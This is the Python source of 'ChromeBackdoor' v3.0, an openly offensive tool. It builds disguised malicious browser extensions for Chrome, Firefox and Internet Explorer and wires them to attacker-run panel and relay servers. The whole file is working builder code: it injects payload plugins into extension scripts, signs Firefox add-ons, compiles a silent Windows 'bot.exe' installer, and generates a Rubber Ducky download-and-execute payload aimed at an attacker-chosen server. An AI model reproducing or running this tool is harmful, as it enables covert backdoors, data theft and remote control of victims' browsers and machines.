#!usr/bin/env python3

import os,sys
import shutil
import subprocess
import random
import glob
import time
import errno
from crxmake import package

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def ducky_payload():
    print bcolors.OKBLUE + "[+] Generate Rubber Ducky payload..." + bcolors.ENDC
    if os.path.exists("backdoor/rubber_ducky/payload.chromebackdoor"):
	open_file = open("backdoor/rubber_ducky/payload.chromebackdoor").read()
	if not os.path.exists("payload.txt"):
	    open_payload = open("payload.txt", "a+")
	    user_input = raw_input("Domain directory (http://localhost.com/dir/)$ ")
	    if user_input == "":
		domain = "http://localhost/dir/"
	    else:
		if not user_input.endswith('/'):
		    user_input = user_input + "/"
		domain = user_input
	    user_input = raw_input("Executable name (bot.exe)$ ")
	    if user_input == "":
		executable = "bot.exe"
	    else:
		executable = user_input
	    content = open_file.replace("%server%", domain)
	    content = content.replace("%exe%", executable)
	    open_payload.write(content)
	    open_payload.close()
	    print bcolors.OKGREEN + "[+] Payload created : " + os.getcwd() + "/payload.txt" + bcolors.ENDC
	else:
	    print bcolors.FAIL + "[!] Payload already here please delete " +os.getcwd() + "/payload.txt" + bcolors.ENDC
    else:
	print bcolors.FAIL + "[-] Payload maker not found" + bcolors.ENDC

def logon():
    print """
       ____ _                              ____             _       _                  
      / ___| |__  _ __ ___  _ __ ___   ___| __ )  __ _  ___| | ____| | ___   ___  _ __ 
     | |   | '_ \| '__/ _ \| '_ ` _ \ / _ \  _ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
     | |___| | | | | | (_) | | | | | |  __/ |_) | (_| | (__|   < (_| | (_) | (_) | |   
      \____|_| |_|_|  \___/|_| |_| |_|\___|____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                          
      VERSION 3.0 - graniet75@gmail.com - @graniet75
    """

def show_plugins(backdoor = ''):
    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Listing payloads..."
    listing = glob.glob('backdoor/plugins/*.chromebackdoor')
    current = 1
    for line in listing:
	if line != "":
	    line = open(line).read()
	    title = line.split('%title%')[1]
	    print "["+bcolors.WARNING+"/"+bcolors.ENDC+"] "+str(current)+" -> " + title.split('%title%')[0]
	    current+=1
    user_input = raw_input("[?] please select numbers ? ")
    if listing[int(user_input) - 1] != "":
	module_content = open(listing[int(user_input) - 1]).read().split("%content%")[1].split("%content%")[0]
	print "["+bcolors.OKBLUE+"*"+bcolors.ENDC+"]" + listing[int(user_input) - 1]
	oned = ""
	if oned == "":
	    action = 0
	    while action == 0:
		if backdoor == "":
		    user_input = raw_input('[?] backdoor folder ? ')
	        else:
		    user_input = backdoor
		if user_input != '':
		   if(os.path.isdir(user_input)):
			if not user_input.endswith('/'):
			    user_input = user_input + "/"
			print "["+bcolors.OKBLUE+"*"+bcolors.ENDC+"] " + user_input
			action = 1
			if(os.path.isfile(user_input + 'iexplorer/script.js')):
			    selected = "iexplorer"
			    open_file = open(user_input + 'iexplorer/script.js').read()
			    content  = open_file.replace("//module",module_content +"\n//module")
			    content = content.replace("%content%", "")
			    new_file = open(user_input +'iexplorer/script.js',"w")
			    new_file.write(content+"\n")
			    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] backdoor iexplorer writed !"
			elif(os.path.isfile(user_input + 'firefox/data/content.js')):
			    selected = "firefox"
			    open_file = open(user_input + 'firefox/data/content.js').read()
			    content  = open_file.replace("//module",module_content +"\n//module")
			    content = content.replace("%content%", "")
			    new_file = open(user_input +'firefox/data/content.js',"w")
			    new_file.write(content+"\n")
			    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] backdoor firefox writed !"
			elif(os.path.isfile(user_input + 'server/js/check.js')):
			    selected = "chrome"
			    open_file = open(user_input + 'server/js/check.js').read()
			    content  = open_file.replace("//module",module_content +"\n//module")
			    content = content.replace("%content%", "")
			    new_file = open(user_input +'server/js/check.js',"w")
			    new_file.write(content+"\n")
			    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] backdoor chrome writed !"

def logo():
    print """
      _                                                    
  ___| |__  _ __ ___  _ __ ___   ___                       
 / __| '_ \| '__/ _ \| '_ ` _ \ / _ \                      
| (__| | | | | | (_) | | | | | |  __/                      
 \___|_| |_|_| _\___/|_| |_| |_|____|   _                  
              | |__   __ _  ___| | ____| | ___   ___  _ __ 
              | '_ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
              | |_) | (_| | (__|   < (_| | (_) | (_) | |   
              |_.__/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                                           
	       (c) Graniet - graniet75@gmail.com - @graniet75                                                
"""

def copy(src, dest):
    try:
        shutil.copytree(src, dest)
    except OSError as e:
        if e.errno == errno.ENOTDIR:
            shutil.copy(src, dest)
        else:
            print('Directory not copied. Error: %s' % e)

def iexplorer():
    backdoor_information = {}
    backdoor_information['gate'] = "index.php"
    backdoor_information['output_dir'] = "backdoor/backdoor"
    backdoor_information['output_name'] = "/iexplorer"
    action = 0
    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] IExplorer backdoor..."
    print "/"+bcolors.WARNING+"!"+bcolors.ENDC+"\\ please use HTTPS hosting for relais information."
    while action == 0:
        site = raw_input("[?] Website host (https://localhost/) ? ")
        if site == "":
	   site = "https://localhost/"
	   action = 1
        elif site.endswith('/'):
	   action = 1
        else:
	   site = site+"/"
	   action = 1
    backdoor_information['site'] = site
    action = 0
    while action == 0:
	relais = raw_input("[?] Relais host (https://localhost/relais) ? ")
	if relais == "":
	    relais =  "https://localhost/relais"
	    action = 1
	elif relais.endswith('/'):
	    relais = relais[:-1]
	    action = 1
	else:
	    action = 1
    backdoor_information['relais'] = relais
    action = 0
    if(os.path.isfile('backdoor/iexplorer/script.js')):
        copy('backdoor/iexplorer/','backdoor/iexplorer_bk/')
        file_read = open('backdoor/iexplorer/script.js').read()
        if "//settings" in file_read:
	    relais = backdoor_information['relais']
            code = file_read.replace("//settings", "\n\n    var server_web = '"+site+"'\n    var lock_page = '"+relais+"/lock.php' \n    var gate_page = '"+relais+"/index.php'\n")
            file_write = open('backdoor/iexplorer_bk/script.js', 'w')
            file_write.write(code)
            file_write.close()
	    copy('backdoor/iexplorer_bk/','backdoor/backdoor/iexplorer')
            copy('backdoor/web/','backdoor/web_bk/')
            file_read = open('backdoor/web/show.php').read()
            if "//settings" in file_read:
		panel = backdoor_information['site']
                code = file_read.replace('//settings', "var server_web = '"+panel+"'\n var gate_page = 'web/show.php'")
                file_write = open('backdoor/web_bk/show.php', 'w')
                file_write.write(code)
                file_write.close()
                #install_relais(panel)
		copy('backdoor/web_bk/','backdoor/backdoor/web/')
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Configure relais information..."
	copy('backdoor/relais/', 'backdoor/relais_bk/')
	file_read = open('backdoor/relais/index.php').read()
	if "//domain" in file_read:
	    domain = backdoor_information['site']
	    code = file_read.replace('//domain', '$domain = "'+domain+'";\n')
	    file_write = open('backdoor/relais_bk/index.php','w')
	    file_write.write(code)
	    file_write.close()
	file_script = open('backdoor/relais/show_script.php').read()
	if "//domain" in file_script:
	    code = file_script.replace('//domain', '$domain = "'+domain+'";\n')
	    file_write = open('backdoor/relais_bk/show_script.php', 'w')
	    file_write.write(code)
	    file_write.close()
	copy('backdoor/relais_bk/','backdoor/backdoor/relais/')
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Successfully configure."
	show_plugins('backdoor/backdoor/')
	name_archive = str(random.randint(1,99999))
	shutil.make_archive(name_archive,'zip', 'backdoor/backdoor/')
	shutil.rmtree('backdoor/iexplorer_bk')
	shutil.rmtree('backdoor/web_bk/')
	shutil.rmtree('backdoor/relais_bk/')
	shutil.rmtree('backdoor/backdoor')
	print bcolors.OKGREEN+"Generation successful :"+os.getcwd()+"/"+name_archive+".zip"+bcolors.ENDC
    else:
        print "not here"

def verify_xpi(information_array):
	output_name = information_array['output_name']
	FNULL = open(os.devnull, 'w')
	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking USER-KEY..."
	config_file = open('config.conf').read()
	user_id = config_file.split('MOZ_API_KEY=')[1].split('#')[0]
	if user_id != '':
		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking PRIV-KEY..."
		priv_key = config_file.split('MOZ_PRIV_KEY=')[1].split('#')[0]
		if priv_key != '':
		    xpi_file = glob.glob(information_array['output_dir']+output_name+'/*.xpi')
		    xpi_file =  xpi_file[0]
		    action = 0
		    while action == 0:
			user_input = raw_input('[?] Directory for XPI load ('+os.getcwd()+') ? ')
			if user_input == '':
			    user_input = os.getcwd()
			    action = 1
			else:
			    if os.path.isdir(user_input):
			    	action = 1
			print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] please wait..."
			try:
			    subprocess.call(["jpm", "-v", "sign", "--api-key="+user_id, "--api-secret="+priv_key, "--xpi="+xpi_file],stdout=FNULL, stderr=subprocess.STDOUT)
			    print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] success sign xpi."
			    time.sleep(100)
			except:
			    print "["+bcolors.FAIL+"-"+bcolors.ENDC+"] Error on sign XPI"
		else:
			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Please configure account on config.ini"
	else:
		print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Please configure account on config.ini"


def generate_xpi(information_array):
	output_name = information_array['output_name']
	FNULL = open(os.devnull, 'w')
	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking JPM..."
	try:
	    subprocess.call(["jpm"],stdout=FNULL, stderr=subprocess.STDOUT)
	    print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] generate XPI file..."
	    subprocess.call(["jpm", "xpi",'--addon-dir='+information_array["output_dir"]+output_name+''],stdout=FNULL, stderr=subprocess.STDOUT)
	    print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] XPI OK." 
	except:
	    	print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Error on JPM please install it."
	user_input = raw_input("[?] sign XPI ? [Y/n]")
	if user_input == '' or user_input == 'y' or user_input == 'Y':
	    verify_xpi(information_array)

def compile_payload(type):
    if type == "--chrome":
	payload_del = "installer/ch/test.crx"
	old_folder = "installer/ch/"
	new_folder = "installer/ch_bk/"
    elif type == "--ie":
	payload_del = "installer/ie/script.js"
	old_folder = "installer/ie"
	new_folder = "installer/ie_bk"
    try:
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Starting installer..."
	subprocess.call(["wine", "start", 'installer/build.cmd'])
	walls = 0
	print "/"+bcolors.WARNING+"!"+bcolors.ENDC+"\\ If popup open please close with <"+bcolors.FAIL+"return"+bcolors.ENDC+"> input."
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Waiting bot.exe"
	time.sleep(20)
	while walls == 0:
	    if os.path.isfile('installer/setup.exe'):
		copy('installer/setup.exe', 'bot.exe')
		os.remove('installer/setup.exe')
		os.remove(payload_del)
		copy(old_folder,new_folder)
		shutil.rmtree(old_folder)
		walls = 1
		print bcolors.OKGREEN+"Generate successful : "+os.getcwd()+"/bot.exe"+bcolors.ENDC
		user_input = raw_input("Generate Rubber Ducky payload [y/N]? $ ")
		if user_input == "Y" or user_input == "y":
		    ducky_payload()
    except:
	print "["+bcolors.WARNING+"-"+bcolors.ENDC+"] Please install wine32"

def executable_silent():
    user_input = raw_input("["+bcolors.OKBLUE+"?"+bcolors.ENDC+"] backdoor type(--chrome,--ie) ? $ ")
    if user_input == "" or user_input == "--chrome":
	action = 0
	while action == 0:
	    user_input = raw_input("["+bcolors.OKBLUE+"?"+bcolors.ENDC+"] crx file ("+os.getcwd()+"/mycrx.crx) ? ")
	    if user_input != "" and os.path.isfile(user_input):
		action = 1
		copy(user_input,'installer/ch_bk/test.crx')
		os.rename('installer/ch_bk/','installer/ch/')
		#backdoor_name = glob.glob('installer/ch/*.crx')[0]
		#print backdoor_name
		compile_payload('--chrome')
    elif user_input == "--ie":
	action = 0
	while action == 0:
	    user_input = raw_input("["+bcolors.OKBLUE+"?"+bcolors.ENDC+"] script file for ie payload (script.js) ? ")
	    if user_input != "":
		if os.path.isfile(user_input):
		    action = 1
		    copy(user_input,"installer/ie_bk/script.js")
		    os.rename('installer/ie_bk/', 'installer/ie/')
		    compile_payload('--ie')

def install_firefox_server():
	backdoor_information = {}
	backdoor_information['gate'] = "index.php"
	backdoor_information['output_dir'] = "backdoor/backdoor"
	backdoor_information['output_name'] = "/firefox"
	action = 0
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Firefox backdoor..."
	print "/"+bcolors.WARNING+"!"+bcolors.ENDC+"\\ please use HTTPS hosting for relais information."
	while action == 0:
	    site = raw_input("[?] Website host (https://localhost/) ? ")
	    if site == "":
		site = "https://localhost/"
		action = 1
	    elif site.endswith('/'):
		action = 1
	    else:
		site = site+"/"
		action = 1
	backdoor_information['site'] = site
	action = 0
	while action == 0:
	    relais = raw_input("[?] Relais host (https://localhost/relais) ? ")
	    if relais == "":
		relais =  "https://localhost/relais"
		action = 1
	    elif relais.endswith('/'):
		relais = relais[:-1]
		action = 1
	    else:
		action = 1
	backdoor_information['relais'] = relais
	action = 0
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Generate Backdoor aspect."
	while action == 0:
	    user_input = raw_input("[?] Name of extension ? ")
	    if user_input != '':
		backdoor_information['name'] = user_input
		action = 1
	action = 0
	while action == 0:
	    user_input = raw_input("[?] Description of extension ? ")
	    if user_input != "":
		backdoor_information['description'] = user_input
		action = 1
	action = 0
	while action == 0:
	    user_input = raw_input("[?] Version of extension ? ")
	    if user_input != "":
		backdoor_information['version'] = user_input
		action = 1
	action = 0
	while action == 0:
	    user_input = raw_input("[?] Icon of extension ("+os.getcwd()+"/backdoor/img/default.png) ? ")
	    if user_input == '':
		backdoor_information['icon'] = user_input
		action = 1
	    else:
		if os.path.isfile("/backdoor/img/" + user_input):
		    backdoor_information['icon'] = user_input
		    action = 1
		elif os.path.isfile(user_input):
		    backdoor_information['icon'] = user_input
		    action = 1
	action = 0
	copy("backdoor/firefox/","backdoor/firefox_bk/")
	open_manifest = open('backdoor/firefox/package.json')
	erase_bk = open('backdoor/firefox_bk/package.json', 'w').close()
	open_bk = open('backdoor/firefox_bk/package.json','a+')
	for line in open_manifest:
	    if "//NAME_NB//" in line:
		line = line.replace("//NAME_NB//", str(random.randint(100,9999)))
	    if "//NAME//" in line:
		print "ok"
		line = line.replace("//NAME//", backdoor_information['name'])
	    if "//DESCRIPTION//" in line:
		line = line.replace("//DESCRIPTION//", backdoor_information['description'])
	    if "//VERSION//" in line:
		line = line.replace("//VERSION//", backdoor_information['version'])
	    open_bk.write(line)
	open_bk.close()
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] generate environement var..."
	open_server = open('backdoor/firefox/data/content.js')
	erase_server = open('backdoor/firefox_bk/data/content.js','w').close()
	new_server = open('backdoor/firefox_bk/data/content.js', 'a+')
	for line in open_server:
	    if "//ENVVAR//" in line:
		server = backdoor_information['relais']
		gate = backdoor_information['gate']
		env = "var server_web='"+server+"';\n var gate_page='"+gate+"';"
		line = line.replace("//ENVVAR//", env)
	    new_server.write(line)
	new_server.close()
	os.makedirs('backdoor/backdoor/')
	copy('backdoor/firefox_bk/','backdoor/backdoor/firefox/')
	generate_xpi(backdoor_information)
	copy('backdoor/web/','backdoor/web_bk/')
	file_read = open('backdoor/web/show.php').read()
	if "//settings" in file_read:
	    panel = backdoor_information['site']
	    code = file_read.replace('//settings', "var server_web = '"+panel+"'\n var gate_page = 'show.php'")
	    file_write = open('backdoor/web_bk/show.php', 'w')
	    file_write.write(code)
	    file_write.close()
	copy('backdoor/web_bk/','backdoor/backdoor/web/')
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Configure relais information..."
	copy('backdoor/relais/', 'backdoor/relais_bk/')
	file_read = open('backdoor/relais/index.php').read()
	if "//domain" in file_read:
	    domain = backdoor_information['site']
	    code = file_read.replace('//domain', '$domain = "'+domain+'";\n')
	    file_write = open('backdoor/relais_bk/index.php','w')
	    file_write.write(code)
	    file_write.close()
	file_script = open('backdoor/relais/show_script.php').read()
	if "//domain" in file_script:
	    code = file_script.replace('//domain', '$domain = "'+domain+'";\n')
	    file_write = open('backdoor/relais_bk/show_script.php', 'w')
	    file_write.write(code)
	    file_write.close()
	copy('backdoor/relais_bk/','backdoor/backdoor/relais/')
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Successfully configure."
	show_plugins('backdoor/backdoor/')
	name_archive = str(random.randint(1,99999))
	shutil.make_archive(name_archive,'zip', 'backdoor/backdoor/')
	shutil.rmtree('backdoor/firefox_bk')
	shutil.rmtree('backdoor/web_bk/')
	shutil.rmtree('backdoor/relais_bk/')
	shutil.rmtree('backdoor/backdoor')
	print bcolors.OKGREEN+"Generation successful :"+os.getcwd()+"/"+name_archive+".zip"+bcolors.ENDC

def install_relais(domain):
    install_status = 0
    try:
        while install_status != 1:
            if domain.endswith('/'):
		print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Configure relais information..."
                copy('backdoor/relais/', 'backdoor/relais_bk/')
                file_read = open('backdoor/relais/index.php').read()
                if "//domain" in file_read:
                    code = file_read.replace('//domain', '$domain = "'+domain+'";\n')
                    file_write = open('backdoor/relais/index.php', 'w')
                    file_write.write(code)
                    file_write.close()
                    file_script = open('backdoor/relais/show_script.php').read()
                    if "//domain" in file_script:
                        code = file_script.replace('//domain', ' $domain = "'+domain+'";\n')
                        file_write = open('backdoor/relais/show_script.php', 'w')
                        file_write.write(code)
                        file_write.close()
                    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Successfully configure."
                    output_filename = str(random.randint(1000,99999))
                    if(os.path.isdir('backdoor/backdoor/')):
                        shutil.rmtree('backdoor/backdoor/')
                    os.makedirs('backdoor/backdoor/')
                    copy('backdoor/web','backdoor/backdoor/web/')
                    copy('backdoor/relais', 'backdoor/backdoor/relais/')
                    copy('backdoor/server', 'backdoor/backdoor/server/')
		    show_plugins('backdoor/backdoor/')
		    package('backdoor/backdoor/server/', outfile='backdoor/backdoor/backdoor')
		    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Write crx..."
		    print "|   backdoor.crx writed."
		    print "|   backdoor.pem writed."
                    shutil.make_archive(output_filename, 'zip', 'backdoor/backdoor/')
                    shutil.rmtree('backdoor/backdoor/')
                    shutil.rmtree('backdoor/web/')
                    shutil.rmtree('backdoor/relais/')
                    shutil.rmtree('backdoor/server/')
                    shutil.move('backdoor/web_bk/', 'backdoor/web/')
                    shutil.move('backdoor/relais_bk/', 'backdoor/relais/')
                    shutil.move('backdoor/server_bk/', 'backdoor/server/')
                    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] New backdoor here : " + os.getcwd() + '/' +output_filename+'.zip'
	            print "|   Good hacking!\n"
                    install_status = 1
            else:
                print "Please use correct url ex: http://site.com/chromebackdoor/"
		domain = raw_input('['+bcolors.OKBLUE+'?'+bcolors.ENDC+'] Website hosted (https://localhost/)? ')
	        if domain == '':
			domain = "https://localhost/"
    except OSError as e:
	print('Directory not copied. Error: %s' % e)

def install_server_chrome():
    try:
        get_url = 1
        while(get_url != 2):
	    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] chrome backdoor..."
            print "/"+bcolors.WARNING+"!"+bcolors.ENDC+"\\ please use HTTPS hosting for relais information."
            panel = raw_input('['+bcolors.OKBLUE+'?'+bcolors.ENDC+'] Website hosted (https://localhost/)? ')
            if panel == '':
		panel = "https://localhost/"
	    print "|   " + panel
            relais = raw_input('['+bcolors.OKBLUE+'?'+bcolors.ENDC+'] Website relais url (https://localhost/relais)? ')
	    if relais == "":
		relais = "https://localhost/relais"
	    
            relais_end = panel + relais
            relais_lock = relais_end +  "/lock.php"
            relais_gate = relais_end + "/index.php"
            print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Web    : " + panel
 	    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Relais : " + relais
	    input_user = raw_input("["+bcolors.OKBLUE+"?"+bcolors.ENDC+"] Information correct [Y/n]? ")
	    if input_user == '' or input_user == 'y' or input_user == 'Y':
  	    	get_url = 2
        if(os.path.isfile('backdoor/server/js/check.js')):
            copy('backdoor/server/','backdoor/server_bk/')
            file_read = open('backdoor/server/js/check.js').read()
            if "//settings" in file_read:
                code = file_read.replace("//settings", "\n\n    var server_web = '"+panel+"'\n    var lock_page = '"+relais+"/lock.php' \n    var gate_page = '"+relais+"/index.php'\n")
                file_write = open('backdoor/server/js/check.js', 'w')
                file_write.write(code)
                file_write.close()
                copy('backdoor/web/','backdoor/web_bk/')
                file_read = open('backdoor/web/show.php').read()
                if "//settings" in file_read:
                    code = file_read.replace('//settings', "var server_web = '"+panel+"'\n var gate_page = 'web/show.php'")
                    file_write = open('backdoor/web/show.php', 'w')
                    file_write.write(code)
                    file_write.close()
                    install_relais(panel)
            else:
                print "not here"
        
    except OSError as e:
	print('Directory not copied. Error: %s' % e)

def help():
	print "["+bcolors.OKBLUE+"!"+bcolors.ENDC+"] Welcome to Chromebackdoor."
	print "--------------------------------------------"
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --firefox : generate firefox XPI backdoor"
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --chrome  : generate GoogleChrome backdoor"
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --ie      : generate IE backdoor"
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --build   : generate silent executable"
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --payload : show available payloads"
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --binder  : compact extension to extension"
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --rubber  : create Rubber Ducky download & execute"
	print "--------------------------------------------"
	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] exemple:"
	print "|   usage : python " + sys.argv[0] + " [CMD]"
	print "\n"
def main():
    if(len(sys.argv) > 1):
        if(sys.argv[1] == "--chrome"):
            install_server_chrome()
	elif(sys.argv[1] == "--firefox"):
	    install_firefox_server()
	elif(sys.argv[1] == "--build"):
	    executable_silent()
	elif(sys.argv[1] == "--ie"):
	    iexplorer()
	elif(sys.argv[1] == "--payload"):
	    show_plugins()
	elif(sys.argv[1] == "--rubber"):
	    ducky_payload()
	else:
	    help()
    else:
	help()
logo()
main()
